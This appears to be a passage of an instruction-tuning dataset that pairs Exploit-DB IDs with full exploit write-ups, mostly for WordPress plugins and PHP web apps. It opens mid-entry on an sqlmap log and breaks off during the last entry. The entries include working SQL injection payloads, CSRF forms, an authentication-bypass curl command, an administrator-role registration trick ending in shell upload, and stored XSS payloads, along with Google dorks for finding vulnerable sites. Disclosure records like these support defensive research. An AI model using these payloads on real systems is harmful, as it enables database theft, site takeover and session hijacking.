'lBki'='lBki&defact=Y\n---\n[12:09:45] [INFO] the back-end DBMS is MySQL\nweb application technology: Apache 2.4.41, PHP 7.3.13\nback-end DBMS: MySQL >= 5.0.12\n[12:09:45] [INFO] fetched data logged to text files under 'C:\\Users\\--------\\AppData\\Local\\sqlmap\\output\\10.61.57.147'\n\n[*] ending @ 12:09:45 /2020-01-23/\n\nhttps://github.com/Gr3gPr1est/BugReport/blob/master/WebTareas2.0_Authenticated_SQLinjection_0day.pdf"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47251",
        "output": {
            "ID": "47251",
            "File": "exploits/php/webapps/47251.txt",
            "Description": "WordPress Plugin Download Manager 2.5 - Cross-Site Request Forgery",
            "Date Published": "2019-08-14",
            "Author": "Princy Edward",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-08-14",
            "Date Updated": "2019-08-14",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Cross-Site Request Forgery (CSRF)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: CSRF vulnerabilities in WordPress Download Manager Plugin 2.5\n# Google Dork: inurl:\"/wp-content/plugins/download-manager\n# Date: 24 may, 2019\n# Exploit Author: Princy Edward\n# Exploit Author Blog : https://prinyedward.blogspot.com/\n# Vendor Homepage: https://www.wpdownloadmanager.com/\n# Software Link: https://wordpress.org/plugins/download-manager/\n# Tested on: Apache/2.2.24 (CentOS)\nPOC \n\n#1 \n\nThere is no CSRF nonce check performed in \"POST\n/wp-admin/admin-ajax.php?action=wpdm_save_email_setting\" request. \n\n#Code\n\n<form method=\"POST\"\naction=\"http://localhost/wp-admin/admin-ajax.php?action=wpdm_save_email_setting\">\n<input type=\"hidden\" name=\"__wpdm_email_template\" value=\"default.html\">\n<input type=\"hidden\" name=\"__wpdm_email_setting[logo]\"\nvalue=\"https://hacker.jpg\">\n<input type=\"hidden\" name=\"__wpdm_email_setting[banner]\"\nvalue=\"https://hacker.jpg\">\n<input type=\"hidden\" name=\"__wpdm_email_setting[footer_text]\"\nvalue=\"https://malicious-url.com\"><input type=\"hidden\" name=\"__wpdm_email_setting[facebook]\"\nvalue=\"https://malicious-url.com\">\n<input type=\"hidden\" name=\"__wpdm_email_setting[twitter]\" value=\"https://malicious-url.com\">\n<input type=\"hidden\" name=\"__wpdm_email_setting[youtube]\"\nvalue=\"https://malicious-url.com\">\n<input type=\"submit\">\n</form>\n\n#2\n\nThere is no CSRF nonce check performed in \"POST\n/wp-admin/edit.php?post_type=wpdmpro&page=templates&_type=email&task=EditEmailTemplat\ne&id=default\" request.\n\n#Code\n\n<form method=\"POST\"\naction=\"http://localhost/wp-admin/edit.php?post_type=wpdmpro&page=templates&_type=email&\ntask=EditEmailTemplate&id=default\">\n<input type=\"hidden\" name=\"id\" value=\"default\">\n<input type=\"hidden\" name=\"email_template[subject]\" value=\"forget password\">\n<input type=\"hidden\" name=\"email_template[message]\" value=\"aaa\">\n<input type=\"hidden\" name=\"email_template[from_name]\" value=\"hacker\">\n<input type=\"hidden\" name=\"email_template[from_email]\" value=\"hacker@hacker.com\">\n<input type=\"submit\">\n</form>"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47567",
        "output": {
            "ID": "47567",
            "File": "exploits/php/webapps/47567.txt",
            "Description": "WordPress Plugin Google Review Slider 6.1 - 'tid' SQL Injection",
            "Date Published": "2019-10-31",
            "Author": "Princy Edward",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2019-10-31",
            "Date Updated": "2019-12-21",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comwp-google-places-review-slider.6.1.zip",
            "Source URL": "",
            "Exploit": "# Exploit Title: Wordpress Plugin Google Review Slider 6.1 - 'tid' SQL Injection\n# Google Dork: inurl:\"/wp-content/plugins/wp-google-places-review-slider/\"\n# Date: 2019-07-02\n# Exploit Author: Princy Edward\n# Exploit Author Blog : https://prinyedward.blogspot.com/\n# Vendor Homepage: https://wordpress.org/plugins/wp-google-places-review-slider/\n# Version: 6.1\n# Tested on: Apache/2.2.24 (CentOS)\n# CVE : \n\n#POC :\n\nGET/wp-admin/admin.php?page=wp_google-templates_posts&tid=1&_wpnonce=***\n&taction=edit HTTP/1.1\n\n#SQLMAP Result :\nsqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:\n---\nParameter: tid (GET)\nType: time-based blind\nTitle: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\nPayload: page=wp_google-templates_posts&tid=1 AND (SELECT 5357 FROM\n(SELECT(SLEEP(5)))kHQz)&_wpnonce=***&taction=edit\n\n# Changeset:\n# Issue fixed in version 6.2\n# https://plugins.trac.wordpress.org/changeset?sfp_email=&sfph_mail=&reponame=&new=2180197%40wp-google-places-review-slider&old=2163061%40wp-google-places-review-slider&sfp_email=&sfph_mail=\n\nCheers!\nPrincyEdward"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47210",
        "output": {
            "ID": "47210",
            "File": "exploits/php/webapps/47210.txt",
            "Description": "WordPress Plugin JoomSport 3.3 - SQL Injection",
            "Date Published": "2019-08-07",
            "Author": "Pablo Santiago",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-08-07",
            "Date Updated": "2019-08-07",
            "Verified": "0",
            "Codes": [
                "CVE-2019-14348"
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comjoomsport-sports-league-results-management.3.3.zip",
            "Source URL": "https://hackpuntes.com/cve-2019-14348-joomsport-for-sports-sql-injection/",
            "Exploit": "# Exploit Title: JoomSport 3.3 \u2013 for Sports - SQL injection\n# Google Dork: intext:powered by JoomSport - sport WordPress plugin\n# Date:29/07/2019.\n# Exploit Author: Pablo Santiago\n# Vendor Homepage: https://beardev.com/\n# Software Link: https://wordpress.org/plugins/joomsport-sports-league-results-management/\n# Version: 3.3\n# Tested on: Windows and Kali linux\n# CVE :2019-14348\n# References: https://hackpuntes.com/cve-2019-14348-joomsport-for-sports-sql-injection/\n\n# 1. Technical Description:\n#Through the SQL injection vulnerability, a malicious user could\ninject SQL code in order to steal information from the database,\nmodify data from the database, even delete database or data from\nthem.\n\n#2.  Request: All requests that contains the parameter sid are\nvulnerables to SQL injection\n\nPOST /wordpress/joomsport_season/new-yorkers/?action=playerlist HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0)\nGecko/20100101 Firefox/67.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: http://localhost/wordpress/joomsport_season/new-yorkers/?action=playerlist\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 22\nDNT: 1\nConnection: close\nCookie: PHPSESSID=s010flbg7fbohnguabsvjaut40\nUpgrade-Insecure-Requests: 1\n\nsid=1&page=1&jscurtab=\n\n# 3. Payload:\n\nParameter: sid (POST)\n   Type: boolean-based blind\n   Title:  Or boolean-based blind - WHERE or HAVING clause\n   Payload: sid=-3506 OR 7339=7339&page=1jscurtab=\n\n# 4. Reference:\n# https://hackpuntes.com/cve-2019-14348-joomsport-for-sports-sql-injection/"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47078",
        "output": {
            "ID": "47078",
            "File": "exploits/php/webapps/47078.txt",
            "Description": "WordPress Plugin Like Button 1.6.0 - Authentication Bypass",
            "Date Published": "2019-07-08",
            "Author": "Benjamin Lim",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-07-08",
            "Date Updated": "2019-07-09",
            "Verified": "0",
            "Codes": [
                "CVE-2019-13344"
            ],
            "Tags": [
                "Authentication Bypass / Credentials Bypass (AB/CB)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comwp-like-button.1.6.0.zip",
            "Source URL": "",
            "Exploit": "Exploit Title: WP Like Button 1.6.0 - Auth Bypass\nDate: 05-Jul-19\nExploit Author: Benjamin Lim\nVendor Homepage: http://www.crudlab.com\nSoftware Link: https://wordpress.org/plugins/wp-like-button/\nVersion: 1.6.0\nCVE : CVE-2019-13344\n\n1. Product & Service Introduction:\nWP Like button allows you to add Facebook like button on your wordpress\nblog. You can also add Share button along with Like button or can add\nrecommend button. As of now, the plugin has been downloaded 129,089 times\nand has 10,000+ active installs.\n\n2. Technical Details & Description:\nAuthentication Bypass vulnerability in the WP Like Button (Free) plugin\nversion 1.6.0 allows unauthenticated attackers to change the settings of\nthe plugin. The contains() function in wp_like_button.php did not check if\nthe current request is made by an authorized user, thus allowing any\nunauthenticated user to successfully update the settings of the plugin.\n\n3. Proof of Concept (PoC):\nFor example, the curl command below allows an attacker to change the\neach_page_url parameter to https://hijack.com. This allows the attacker to\nhijack Facebook likes.\n\ncurl -k -i --raw -X POST -d\n\"page=facebook-like-button&site_url=https%%3A%%2F%%2Flocalhost%%2Fwp&display[]=1&display[]=2&display[]=4&display[]=16&mobile=1&fb_app_id=&fb_app_admin=&kd=0&fblb_default_upload_image=&code_snippet=%%3C%%3Fphp+echo+fb_like_button()%%3B+%%3F%%3E&beforeafter=before&eachpage=url&each_page_url=\nhttps://hijack.com&language=en_US&width=65&position=center&layout=box_count&action=like&color=light&btn_size=small&faces=1&share=1&update_fblb=\"\n\"https://localhost/wp/wp-admin/admin.php?page=facebook-like-button&edit=1\"\n-H \"Content-Type: application/x-www-form-urlencoded\"\n\n4. Mitigation\nNo update has been released by the vendor. Users are advised to switch to a\ndifferent plugin.\n\n5. Disclosure Timeline\n2019/06/24 Vendor contacted regarding vulnerability in v1.5.0 (crudlab@gmail.com)\n2019/06/30 Second email sent to vendor (crudlab@gmail.com)\n2019/07/02 Vendor released v1.6.0 update. Vulnerability still exists.\nVendor did not acknowledge any emails.\n2018/07/03 Third email sent to vendor's billing email domain (info@purelogics.net)\n2018/07/05 Public disclosure\n\n6. Credits & Authors:\nBenjamin Lim - [https://limbenjamin.com]"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47373",
        "output": {
            "ID": "47373",
            "File": "exploits/php/webapps/47373.txt",
            "Description": "WordPress Plugin Photo Gallery 1.5.34 - Cross-Site Scripting (2)",
            "Date Published": "2019-09-10",
            "Author": "MTK",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-09-10",
            "Date Updated": "2019-09-10",
            "Verified": "0",
            "Codes": [
                "CVE-2019-16118"
            ],
            "Tags": [
                "Cross-Site Scripting (XSS)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comphoto-gallery.1.5.34.zip",
            "Source URL": "",
            "Exploit": "# Exploit Title: WordPress Plugin Photo Gallery by 10Web <= 1.5.34 - Persistent Cross Site Scripting\n# inurl:\"\\wp-content\\plugins\\photo-gallery\"\n# Date: 09-10-2019\n# Exploit Author: MTK (http://mtk911.cf/)\n# Vendor Homepage: https://10web.io/\n# Software Link: https://downloads.wordpress.org/plugin/photo-gallery.1.5.34.zip\n# Version: Up to v1.5.34\n# Tested on: Apache2/WordPress 5.2.2 - Firefox/Windows\n# CVE : 2019-16118\n\n# Software description:\nPhoto Gallery is the leading plugin for building beautiful mobile-friendly galleries in a few minutes.\n\n\n# Technical Details & Impact:\nXSS flaws occur whenever an application includes untrusted data in a new web page without proper validation or escaping, or updates an existing web page with user supplied data using a browser API that can create JavaScript. XSS allows attackers to execute scripts in the victim\u2019s browser which can hijack user sessions, deface web sites, or redirect the user to malicious sites.\n\n\n# POC\n\n1.    Go to options tab select watermark tab \n2.    Select text as watermark type\n3.    Add watermark text as XSS payload e.g;\n\"'><img src=a onerror='alert(2);'\n4.    Click Save.\n5.    It will show pop-up confirming existence of XSS vulnerability\n\n# Timeline\n09-01-2019 - Vulnerability Reported\n09-03-2019 - Vendor responded\n09-04-2019 - New version released (1.5.35)\n09-10-2019 - Full Disclosure\n\n# References:\nhttps://wordpress.org/plugins/photo-gallery/#developers\nhttps://plugins.trac.wordpress.org/changeset/2150912/photo-gallery/trunk/admin/controllers/Options.php?old=2142624&old_path=photo-gallery%2Ftrunk%2Fadmin%2Fcontrollers%2FOptions.php\nhttps://plugins.trac.wordpress.org/changeset/2150912/photo-gallery/trunk/js/bwg.js?old=2135029&old_path=photo-gallery%2Ftrunk%2Fjs%2Fbwg.js\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16118"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47371",
        "output": {
            "ID": "47371",
            "File": "exploits/php/webapps/47371.txt",
            "Description": "WordPress Plugin Photo Gallery 1.5.34 - SQL Injection",
            "Date Published": "2019-09-10",
            "Author": "MTK",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-09-10",
            "Date Updated": "2019-09-10",
            "Verified": "0",
            "Codes": [
                "CVE-2019-16119"
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comphoto-gallery.1.5.34.zip",
            "Source URL": "",
            "Exploit": "# Exploit Title: WordPress Plugin Photo Gallery by 10Web <= 1.5.34 - Blind SQL injection\n# inurl:\"\\wp-content\\plugins\\photo-gallery\"\n# Date: 09-10-2019\n# Exploit Author: MTK (http://mtk911.cf/)\n# Vendor Homepage: https://10web.io/\n# Software Link: https://downloads.wordpress.org/plugin/photo-gallery.1.5.34.zip\n# Version: Up to v1.5.34\n# Tested on: Apache2/WordPress 5.2.2 - Firefox/Windows - SQLMap\n# CVE : 2019-16119\n\n# Software description:\nPhoto Gallery is the leading plugin for building beautiful mobile-friendly galleries in a few minutes.\n\n\n# Technical Details & Impact:\nThrough the SQL injection vulnerability, a malicious user could inject SQL code in order to steal information from the database, modify data from the database, even delete database or data from\nthem.\n\n# POC\nIn Gallery Group tab > Add new and in add galleries / Gallery groups. GET request going with parameter album_id is vulnerable to Time Based Blind SQL injection.  Following is the POC,\n\n1.   http://127.0.0.1/wp-admin/admin-ajax.php?action=albumsgalleries_bwg&album_id=<SQLi+HERE>&width=785&height=550&bwg_nonce=9e367490cc&\n\n2.    http://127.0.0.1/wp-admin/admin-ajax.php?action=albumsgalleries_bwg&album_id=0 AND (SELECT 1 FROM (SELECT(SLEEP(10)))BLAH)&width=785&height=550&bwg_nonce=9e367490cc&\n\n\n# Timeline\n09-01-2019 - Vulnerability Reported\n09-03-2019 - Vendor responded\n09-04-2019 - New version released (1.5.35)\n09-10-2019 - Full Disclosure\n\n# References:\nhttps://wordpress.org/plugins/photo-gallery/#developers\nhttps://plugins.trac.wordpress.org/changeset/2150912/photo-gallery/trunk/admin/controllers/Albumsgalleries.php?old=1845136&old_path=photo-gallery%2Ftrunk%2Fadmin%2Fcontrollers%2FAlbumsgalleries.php\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16119"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47540",
        "output": {
            "ID": "47540",
            "File": "exploits/php/webapps/47540.txt",
            "Description": "WordPress Plugin Sliced Invoices 3.8.2 - 'post' SQL Injection",
            "Date Published": "2019-10-24",
            "Author": "Lucian Ioan Nitescu",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2019-10-24",
            "Date Updated": "2019-12-21",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Wordpress Sliced Invoices 3.8.2 - 'post' SQL Injection\n# Date: 2019-10-22\n# Exploit Author: Lucian Ioan Nitescu\n# Contact: https://twitter.com/LucianNitescu\n# Webiste: https://nitesculucian.github.io\n# Vendor Homepage: https://slicedinvoices.com/\n# Software Link: https://wordpress.org/plugins/sliced-invoices/\n# Version: 3.8.2\n# Tested on: Ubuntu 18.04 / Wordpress 5.3\n \n# 1. Description:  \n# Wordpress Sliced Invoices plugin with a version lower then 3.8.2 is affected \n# by an Authenticated SQL Injection vulnerability.\n\n# 2. Proof of Concept: \n# Authenticated SQL Injection:\n- Using an Wordpress user, access <your target> /wp-admin/admin.php?action=duplicate_quote_invoice&post=8%20and%20(select*from(select(sleep(20)))a)--%20\n- The response will be returned after 20 seconds proving the successful exploitation of the vulnerability.\n- Sqlmap can be used to further exploit the vulnerability."
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 46083",
        "output": {
            "ID": "46083",
            "File": "exploits/php/webapps/46083.txt",
            "Description": "WordPress Plugin UserPro < 4.9.21 - User Registration Privilege Escalation",
            "Date Published": "2019-01-07",
            "Author": "Noman Riffat",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-01-07",
            "Date Updated": "2019-01-07",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Authentication Bypass / Credentials Bypass (AB/CB)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Wordpress Plugin UserPro < 4.9.21 User Registration With Administrator Role\n# Google Dork: inurl:/wp-content/plugins/userpro/\n# Date: 3rd January, 2019\n# Exploit Author: Noman Riffat\n# Vendor Homepage: https://userproplugin.com/\n# Software Link: https://codecanyon.net/item/userpro-user-profiles-with-social-login/5958681\n# Version: < 4.9.21\n# Tested on: Wordpress 4.9.9 with linux but should work on all WP versions and OS as well\n\nUserPro fixed a user registration with administrator privileges vulnerability in version 4.9.21\nBut there wasn't any POC available so this exploit demonstrates this\nvulnerability.\nhttps://demo.userproplugin.com/wp-content/plugins/userpro/changelog.txt\nFrom the changelog: \"Security Fix : Registration role validation fix\"\n\nThe latest version up to now is 4.9.29\nThe vulnerability allows anyone to register with Administrator role which\ncan easily be turned into RCE\n\nSteps to reproduce:\n\n1. Go to the registration form, input random fake values, trigger Burp\nSuite and click submit.\n\n2. The POST data will look similar to following\n\nredirect_uri-701=&_myuserpro_nonce=xxxxxx&_wp_http_referer=%2F&unique_id=701&user_login-701=USERNAME&user_email-701=\nUSERNAME@EMAIL.COM\n&user_pass-701=PASSWORD&user_pass_confirm-701=PASSWORD&display_name-701=&profilepicture-701=&country-701=&facebook-701=&twitter-701=&google_plus-701=&user_url-701=&terms=on&action=userpro_process_form&template=register&group=default&shortcode=xxxxxxxxxxxxxxxxxxxxxxxxxxx\n\nHere \"-701\" is a random postfix number and gets stripped at the server.\nOther than that, the interesting values are\n\nuser_login\nuser_email\nuser_pass\nuser_pass_confirm\n\n3. Adding following extra parameter in POST data will register the user\nwith Administrator privileges\n\nrole-701=administrator\n\nSo the modified POST data will look similar to following\n\nrole-701=administrator&redirect_uri-701=&_myuserpro_nonce=xxxxxx&....snip....snip....\n\n4. Forward the POST data in Burp Suite and you will get redirect to\n/profile/ page with Administrator menu on top. Access /wp-admin/ to get to\nthe dashboard\n\n5. Upload shell with default methods\n\n@nomanriffat"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47294",
        "output": {
            "ID": "47294",
            "File": "exploits/php/webapps/47294.txt",
            "Description": "YouPHPTube 7.2 - 'userCreate.json.php' SQL Injection",
            "Date Published": "2019-08-19",
            "Author": "Fabian Mosch",
            "Type": "webapps",
            "Platform": "php",
            "Port": "80",
            "Date Added": "2019-08-19",
            "Date Updated": "2019-08-19",
            "Verified": "0",
            "Codes": [
                "CVE-2019-14430"
            ],
            "Tags": [
                "SQL Injection (SQLi)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comYouPHPTube-7.2.tar.gz",
            "Source URL": "",
            "Exploit": "# Exploit Title: YouPHPTube < 7.3 SQL Injection\n# Google Dork: /\n# Date: 19.08.2019\n# Exploit Author: Fabian Mosch, r-tec IT Security GmbH\n# Vendor Homepage: https://www.youphptube.com/\n# Software Link: https://github.com/YouPHPTube/YouPHPTube\n# Version: < 7.3\n# Tested on: Linux/Windows\n# CVE : CVE-2019-14430\n\nThe parameters \"User\" as well as \"pass\" of the user registration function are vulnerable to SQL injection vulnerabilities. By submitting an HTTP POST request to the URL \"/objects/userCreate.json.php\" an attacker can access the database and read the hashed credentials of an administrator for example.\n\nExample Request:\n\nPOST /objects/userCreate.json.php HTTP/1.1\nHost: vulnerablehost.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: */*\nAccept-Language: de,en-US;q=0.7,en;q=0.3\nAccept-Encoding: gzip, deflate\n[SomeHeaders and Cookies]\n\nuser=tes'INJECTHERE&pass=test'INJECTHERE &email=test%40example.com&name=test&captcha=xxxxx\n\nMethods for DB-Extraction are:\n\n\n- Boolean-based blind\n\n- Error-based\n\n- AND/OR time-based blind\n\n\nThe vulnerability was fixed with this commit:\nhttps://github.com/YouPHPTube/YouPHPTube/commit/891843d547f7db5639925a67b7f2fd66721f703a"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 48189",
        "output": {
            "ID": "48189",
            "File": "exploits/php/webapps/48189.txt",
            "Description": "YzmCMS 5.5 - 'url' Persistent Cross-Site Scripting",
            "Date Published": "2020-03-10",
            "Author": "En_dust",
            "Type": "webapps",
            "Platform": "php",
            "Port": "",
            "Date Added": "2020-03-10",
            "Date Updated": "2020-03-10",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Cross-Site Scripting (XSS)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comyzmcms-5.3.0.tar.gz",
            "Source URL": "",
            "Exploit": "# Exploit Title: YzmCMS 5.5 - 'url' Persistent Cross-Site Scripting\n# Google Dork: N/A\n# Date: 2020-03-10\n# Exploit Author: En\n# Vendor Homepage: https://github.com/yzmcms/yzmcms\n# Software Link: https://github.com/yzmcms/yzmcms\n# Version: V5.5\n# Category: Web Application\n# Patched Version: unpatched\n# Tested on: Win10x64\n# Platform: PHP\n# CVE : N/A\n#Exploit Author: En_dust\n\n#Description\uff1a\n#The add function defined in the Application/link/controller/link.class.php file does not filter the \u2018url\u2019 parameter, causing malicious code to be executed.\n\n\n#PoC\uff1a\nPOST /yzmcms/link/link/add.html HTTP/1.1\nHost: 127.0.0.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0\nAccept: application/json, text/javascript, */*; q=0.01\nAccept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nReferer: http://127.0.0.1/yzmcms/link/link/add.html\nContent-Length: 130\nCookie: CNZZDATA1261218610=2106045875-1559549499-%7C1569374982; PHPSESSID=fr095t87brjfc0l7d7sgj8oml4; yzmphp_adminid=45dfDWXXjGQg2Ce7Yg7oJZbld7iy8SN43sy2SKjq; yzmphp_adminname=7e49R0HXcjLHqBu5wgd9vXbD_D-Bq3Uq8TLw5UNpi8lIAw\nDNT: 1\nConnection: close\n\nname=evalWebsite&url=javascript%3Aalert(%2FXSS%2F)&username=&email=&linktype=0&logo=&typeid=0&msg=&listorder=1&status=1&dosubmit=1"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 47440",
        "output": {
            "ID": "47440",
            "File": "exploits/python/webapps/47440.txt",
            "Description": "thesystem 1.0 - Cross-Site Scripting",
            "Date Published": "2019-09-30",
            "Author": "An\u0131l Baran Yelken",
            "Type": "webapps",
            "Platform": "python",
            "Port": "",
            "Date Added": "2019-09-30",
            "Date Updated": "2019-09-30",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                "Cross-Site Scripting (XSS)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "http://www.exploit-db.comthesystem-master.zip",
            "Source URL": "",
            "Exploit": "# Exploit Title: thesystem Persistent XSS \n# Author: An\u0131l Baran Yelken \n# Discovery Date: 2019-09-28 \n# Vendor Homepage: https://github.com/kostasmitroglou/thesystem \n# Software Link: https://github.com/kostasmitroglou/thesystem \n# Tested Version: 1.0 \n# Tested on OS: Windows 10 \n# CVE: N/A \n# Type: Webapps \n# Description: \n# Persistent XSS after login bypass(login_required didn't used) \n\nFirst of all, I send a request add_server \nPOST /add_server/ HTTP/1.1 \nHost: 127.0.0.1:8000 \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 \nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 \nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3 \nAccept-Encoding: gzip, deflate \nContent-Type: multipart/form-data; boundary=---------------------------3902153292 \nContent-Length: 1205 \nConnection: close \nReferer: http://127.0.0.1:8000/add_server/ \nCookie: csrftoken=Mss47G2ILybbQoFYXpVPlWNaUzGQ5yKoXGRPucrKIG4gz5X9TVEPQJtItbqN9SM6; _ga=GA1.1.567905900.1569231977; _gid=GA1.1.882048829.1569577719 \nUpgrade-Insecure-Requests: 1 \n-----------------------------3902153292 \nContent-Disposition: form-data; name=\"csrfmiddlewaretoken\" \nS5HLlkGrTnGH2FHIP4ry58Mw8Rw9KiPF3j6wIQ5tQvzMLmZTLAayAVs4Htg6OCRn \n-----------------------------3902153292 \nContent-Disposition: form-data; name=\"operating_system\" \n<script>alert(\"kale1\")</script> \n-----------------------------3902153292 \nContent-Disposition: form-data; name=\"ip_address\" \n127.0.0.1 \n-----------------------------3902153292 \nContent-Disposition: form-data; name=\"system_port\" \n22 \n-----------------------------3902153292 \nContent-Disposition: form-data; name=\"system_owner\" \n<script>alert(\"kale2\")</script> \n-----------------------------3902153292 \nContent-Disposition: form-data; name=\"system_username\" \n<script>alert(\"kale3\")</script> \n-----------------------------3902153292 \nContent-Disposition: form-data; name=\"system_password\" \n<script>alert(\"kale4\")</script> \n-----------------------------3902153292 \nContent-Disposition: form-data; name=\"system_description\" \n<script>alert(\"kale5\")</script> \n-----------------------------3902153292 \nContent-Disposition: form-data; name=\"server_name\" \n<script>alert(\"kale6\")</script> \n-----------------------------3902153292-- \n\nAfter I send a request show_server_data \nGET /show_server_data/ HTTP/1.1 \nHost: 127.0.0.1:8000 \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 \nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 \nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3 \nAccept-Encoding: gzip, deflate \nConnection: close \nReferer: http://127.0.0.1:8000/data/ \nCookie: csrftoken=Mss47G2ILybbQoFYXpVPlWNaUzGQ5yKoXGRPucrKIG4gz5X9TVEPQJtItbqN9SM6; _ga=GA1.1.567905900.1569231977 \nUpgrade-Insecure-Requests: 1 \n\nAnd I showed persistent XSS: \nHTTP/1.1 200 OK \nDate: Sat, 28 Sep 2019 09:51:04 GMT \nServer: WSGIServer/0.2 CPython/3.5.3 \nContent-Length: 437 \nContent-Type: text/html; charset=utf-8 \nX-Frame-Options: SAMEORIGIN \n(23, 'test', '192.168.1.4', '22', 'test@test', 'root', '1234', 'test', 'test', '2019-09-26')(24, '<h1>Unix', '192.168.1.5', '22', 'test@test', 'root', '1234', 'test2', 'test2', '2019-09-26')(25, '<script>alert(\"kale1\")</script>', '127.0.0.1', '22', '<script>alert(\"kale2\")</script>', '<script>alert(\"kale3\")</script>', '<script>alert(\"kale4\")</script>', '<script>alert(\"kale5\")</script>', '<script>alert(\"kale6\")</script>', '2019-09-28')"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 44881",
        "output": {
            "ID": "44881",
            "File": "exploits/xml/webapps/44881.txt",
            "Description": "OX App Suite 7.8.4 - Multiple Vulnerabilities",
            "Date Published": "2018-06-12",
            "Author": "Open-Xchange",
            "Type": "webapps",
            "Platform": "xml",
            "Port": "",
            "Date Added": "2018-06-12",
            "Date Updated": "2018-06-12",
            "Verified": "0",
            "Codes": [
                "CVE-2018-5756;CVE-2018-5755;CVE-2018-5754;CVE-2018-5753;CVE-2018-5752;CVE-2018-5751;CVE-2017-17062"
            ],
            "Tags": [
                "Cross-Site Scripting (XSS)"
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
